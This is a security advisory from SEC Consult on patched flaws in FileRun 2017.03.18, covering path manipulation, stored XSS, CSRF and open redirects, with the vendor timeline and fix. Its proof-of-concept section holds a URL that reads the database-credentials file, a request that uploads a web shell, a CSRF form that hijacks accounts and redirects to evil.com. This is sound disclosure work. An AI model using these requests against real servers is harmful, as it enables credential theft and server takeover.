@@ -1,0 +1,268 @@
+SEC Consult Vulnerability Lab Security Advisory < 20171018-0 >
+=======================================================================
+              title: Multiple vulnerabilities
+            product: Afian AB FileRun
+ vulnerable version: 2017.03.18
+      fixed version: 2017.09.18
+             impact: critical
+           homepage: https://www.filerun.com | https://afian.se
+              found: 2017-08-28
+                 by: Roman Ferdigg (Office Vienna)
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Bangkok - Berlin - Linz - Luxembourg - Montreal - Moscow
+                     Kuala Lumpur - Singapore - Vienna (HQ) - Vilnius - Zurich
+
+                     https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"FileRun File Manager: access your files anywhere through self-hosted
+secure cloud storage, file backup and sharing for your photos, videos,
+files and more. Upload and download large files for easy sharing. Google
+Drive self-hosted alternative."
+
+Source: https://www.filerun.com
+
+
+Business recommendation:
+------------------------
+By exploiting the vulnerabilities documented in this advisory, an attacker
+can compromise the web server which has FileRun installed. User files might
+get exposed through this attack.
+
+SEC Consult recommends not to use FileRun until a thorough security review
+has been performed by security professionals and all identified issues have
+been resolved.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Path Manipulation
+When uploading, downloading or viewing files, FileRun uses a parameter to
+specify the path on the file-system. An attacker can manipulate the value
+of this parameter to read, create and even overwrite files in certain
+folders. An attacker could upload malicious files to compromise the
+webserver. In combination with the open redirect and CSRF vulnerability
+even an unauthenticated attacker can upload these files to get a shell.
+Through the shell all user files can be accessed.
+
+
+2) Stored Cross Site Scripting (XSS) via File Upload
+The application allows users to upload different file types. It is also
+possible to upload HTML files or to create them via the application's text
+editor. Files can be shared using a link or within the FileRun application
+(in the enterprise version). An attacker can inject JavaScript in HTML
+files to attack other users or simply create a phishing site to steal user
+credentials.
+
+Remark:
+In the standard configuration of the FileRun docker image the HttpOnly
+cookie flag is not set, which means that authentication cookies can be
+accessed in an XSS attack. This allows easy session hijacking as well.
+
+
+3) Cross Site Request Forgery (CSRF)
+The application does not implement CSRF protection. An attacker can exploit
+this vulnerability to execute arbitrary requests with the privileges of the
+victim. The only requirement is that a victim visits a malicious webpage.
+Such a page could be hosted on the FileRun server itself and shared with
+other users as described in vulnerability 2.
+Besides others, the following actions can be performed via CSRF if the
+victim has administrative privileges:
+ - Create or delete users
+ - Change permissions rights of users
+ - Change user passwords
+
+If the victim has no administrative privileges, for example the following
+actions can be performed:
+ - Upload files
+ - Change the email address (for password recovery)
+
+
+4) Open Redirect Vulnerabilities
+An open redirect vulnerability in the login and logout pages allows an
+attacker to redirect users to arbitrary web sites. The redirection host
+could be used for phishing attacks (e.g. to steal user credentials) or for
+running browser exploits to infect a victim's machine with malware. The open
+redirect in the login page could also be used to exploit CSRF (see above).
+Because the server name in the manipulated link is identical to the
+original site, phishing attempts may have a more trustworthy appearance.
+
+
+Proof of concept:
+-----------------
+1) Path Manipulation
+The URL below is used to read the application file "autoconfig.php", which
+contains the username and cleartext password of the database.
+
+URL:
+http://$DOMAIN/?module=custom_actions&action=open_in_browser&path=/var/www/html/system/data/autoconfig.php
+
+
+This post request is used to upload a PHP shell in the writable folder
+avatars:
+
+POST /?module=fileman_myfiles&section=ajax&page=up HTTP/1.1
+Host: $DOMAIN
+[...]
+Content-Type: multipart/form-data; boundary=---------------------------293712729522107
+Cookie: FileRunSID=t5h7lm99r1ff0quhsajcudh7t0; language=english
+DNT: 1
+Connection: close
+
+-----------------------------293712729522107
+Content-Disposition: form-data; name="flowTotalSize"
+
+150
+-----------------------------293712729522107
+Content-Disposition: form-data; name="flowIsFirstChunk"
+
+1
+-----------------------------293712729522107
+Content-Disposition: form-data; name="flowIsLastChunk"
+
+1
+-----------------------------293712729522107
+Content-Disposition: form-data; name="flowFilename"
+
+shell.php
+-----------------------------293712729522107
+Content-Disposition: form-data; name="path"
+
+/var/www/html/system/data/avatars/
+-----------------------------293712729522107
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: application/octet-stream
+
+*web shell payload here*
+
+-----------------------------293712729522107--
+
+To execute the uploaded shell a .htaccess file with the contents below can
+be uploaded in the same folder.
+
+Content of .htaccess file:
+<Files  "*">
+ Order allow,deny
+ Allow from all
+</Files>
+
+The uploaded shell can be accessed by the following URL:
+http://$DOMAIN/?module=custom_actions&action=open_in_browser&path=/var/www/html/system/data/avatars/shell.php
+
+2) Stored Cross Site Scripting (XSS) via File Upload
+An HTML file with JavaScript code can be easily uploaded to attack other users.
+No PoC necessary.
+
+3) Cross Site Request Forgery
+An example for a CSRF attack would be the following request which changes
+the email address of the victim:
+
+<html>
+  <body>
+    <form action="http://$DOMAIN/?module=fileman&section=profile&action=save"
+method="POST">
+      <input type="hidden" name="receive_notifications" value="0" />
+      <input type="hidden" name="two_step_enabled" value="0" />
+      <input type="hidden" name="name" value="User" />
+      <input type="hidden" name="name2" value="A" />
+      <input type="hidden" name="email" value="newemail@example.com" />
+      <input type="hidden" name="ext-comp-1009" value="on" />
+      <input type="hidden" name="current_password" value="" />
+      <input type="hidden" name="new_password" value="" />
+      <input type="hidden" name="confirm_new_password" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+The new email address can be used by the attacker to reset the password of
+the victim.
+
+
+4) Open Redirect Vulnerabilites
+The URL below can be used to forward a user to an arbitrary website after
+the login:
+http://$DOMAIN/?redirectAfterLogin=aHR0cDovL3d3dy5ldmlsLmNvbQ==
+
+The value of the redirect parameter needs to be base64 encoded.
+
+To redirect a user after logout, following URL can be used:
+http://$DOMAIN/?module=fileman&page=logout&redirect=http://evil.com
+
+In this case for a successful exploit, the victim has to be logged in.
+
+
+Vulnerable / tested versions:
+-----------------------------
+The regular version of FileRun 2017.03.18 has been tested. It is assumed
+earlier versions of FileRun are also vulnerable to the issues.
+
+
+Vendor contact timeline:
+------------------------
+2017-08-31: Contacting vendor through info@afian.se, info@filerun.com
+2017-09-01: Sending unencrypted advisory as requested by vendor
+2017-09-04: FileRun fixed the vulnerability "Path Manipulation"
+2017-09-12: Requesting a status update
+2017-09-13: FileRun informed us that a patch for all vulnerabilities will
+            be released before 2017-09-20
+2017-09-16: Patch available
+2017-10-18: Public release of security advisory
+
+
+Solution:
+---------
+Update to the latest version available (see https://docs.filerun.com/updating).
+According to FileRun, all the vulnerabilities are fixed in release
+2017.09.18 or higher.
+
+For further information see:
+https://www.filerun.com/changelog
+
+
+Workaround:
+-----------
+No workaround available.
+
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+SEC Consult Vulnerability Lab
+
+SEC Consult
+Bangkok - Berlin - Linz - Luxembourg - Montreal - Moscow
+Kuala Lumpur - Singapore - Vienna (HQ) - Vilnius - Zurich
+
+About SEC Consult Vulnerability Lab
+The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
+ensures the continued knowledge gain of SEC Consult in the field of network
+and application security to stay ahead of the attacker. The SEC Consult
+Vulnerability Lab supports high-quality penetration testing and the evaluation
+of new offensive and defensive technologies for our customers. Hence our
+customers obtain the most current information about vulnerabilities and valid
+recommendation about the risk profile of new technologies.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Interested to work with the experts of SEC Consult?
+Send us your application https://sec-consult.com/en/career/index.html
+
+Interested in improving your cyber security with the experts of SEC Consult?
+Contact our local offices https://sec-consult.com/en/contact/index.html
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Mail: research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+EOF Roman Ferdigg / @2017
